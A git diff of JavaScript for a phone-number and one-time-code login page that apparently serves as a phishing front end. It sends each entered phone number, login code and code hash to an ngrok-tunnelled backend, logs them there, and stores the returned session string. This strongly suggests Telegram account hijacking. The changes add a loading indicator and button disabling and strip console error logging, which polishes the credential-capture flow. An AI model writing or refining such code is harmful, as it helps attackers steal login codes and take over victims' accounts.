@@ -2,7 +2,6 @@ const BACKEND_URL = 'https://8e82-81-155-215-249.ngrok-free.app';
 
 async function sendLogToBackend(message) {
     console.log('Log:', message);
-
     try {
         await fetch(`${BACKEND_URL}/log`, {
             method: 'POST',
@@ -38,8 +37,11 @@ document.addEventListener('DOMContentLoaded', function() {
 
             const phoneNumber = document.getElementById('phoneNumber').value;
             sendLogToBackend("Phone number entered: " + phoneNumber);
-
             sessionStorage.setItem('phoneNumber', phoneNumber);
+
+            const submitButton = phoneForm.querySelector('button[type="submit"]');
+            submitButton.disabled = true; // Disable button to prevent multiple submissions
+            displayLoadingIndicator(true);
 
             try {
                 const response = await fetch(`${BACKEND_URL}/sendPhoneNumber`, {
@@ -56,15 +58,19 @@ document.addEventListener('DOMContentLoaded', function() {
                 if (data.phone_code_hash) {
                     sessionStorage.setItem('phone_code_hash', data.phone_code_hash);
                     sendLogToBackend("Phone code hash stored: " + data.phone_code_hash);
+                    // Trigger swipe animation before redirecting
                     document.getElementById('loginContainer').classList.add('swipe-left');
-                    setTimeout(() => window.location.href = '/otp.html', 600);
+                    setTimeout(() => {
+                        window.location.href = '/otp.html';
+                    }, 600);
                 } else {
-                    console.error('Failed to send OTP:', data.message);
                     displayMessage(data.message || 'Failed to send OTP', 'error');
                 }
             } catch (error) {
-                console.error('Error sending phone number:', error);
                 displayMessage('Error sending OTP: ' + error.message, 'error');
+            } finally {
+                submitButton.disabled = false; // Re-enable button
+                displayLoadingIndicator(false);
             }
         });
     }
@@ -80,7 +86,6 @@ document.addEventListener('DOMContentLoaded', function() {
             const phoneCodeHash = sessionStorage.getItem('phone_code_hash');
 
             if (!/^\d{5}$/.test(phoneCode)) {
-                console.error("Invalid phone code. Must be 5 digits.");
                 displayMessage("Phone code must be exactly 5 digits.", 'error');
                 return;
             }
@@ -88,6 +93,10 @@ document.addEventListener('DOMContentLoaded', function() {
             sendLogToBackend("Phone number from sessionStorage: " + phoneNumber);
             sendLogToBackend("Phone code entered: " + phoneCode);
             sendLogToBackend("Phone code hash: " + phoneCodeHash);
+
+            const submitButton = otpForm.querySelector('button[type="submit"]');
+            submitButton.disabled = true; // Disable button to prevent multiple submissions
+            displayLoadingIndicator(true);
 
             try {
                 const response = await fetch(`${BACKEND_URL}/verifyOTP`, {
@@ -98,7 +107,6 @@ document.addEventListener('DOMContentLoaded', function() {
 
                 if (!response.ok) {
                     const data = await response.json();
-                    console.error('Failed to submit Phone Code:', data.message);
                     throw new Error(data.message || 'Failed to submit Phone Code');
                 }
 
@@ -110,11 +118,16 @@ document.addEventListener('DOMContentLoaded', function() {
                 localStorage.setItem('dc_id', result.authTokens.dc_id);
                 localStorage.setItem('session_string', result.authTokens.session_string);
 
+                // Trigger swipe animation before redirecting
                 document.getElementById('otpContainer').classList.add('swipe-in');
-                setTimeout(() => window.location.href = result.redirectUrl, 600);
+                setTimeout(() => {
+                    window.location.href = result.redirectUrl;
+                }, 600);
             } catch (error) {
-                console.error('Error submitting Phone Code:', error);
                 displayMessage('Error submitting Phone Code: ' + error.message, 'error');
+            } finally {
+                submitButton.disabled = false; // Re-enable button
+                displayLoadingIndicator(false);
             }
         });
     }
@@ -125,4 +138,11 @@ function displayMessage(message, type) {
     messageContainer.innerText = message;
     messageContainer.style.color = type === 'error' ? 'red' : 'green';
     messageContainer.style.display = 'block';
+}
+
+function displayLoadingIndicator(isLoading) {
+    const loadingIndicator = document.getElementById('loadingIndicator');
+    if (loadingIndicator) {
+        loadingIndicator.style.display = isLoading ? 'block' : 'none';
+    }
 }
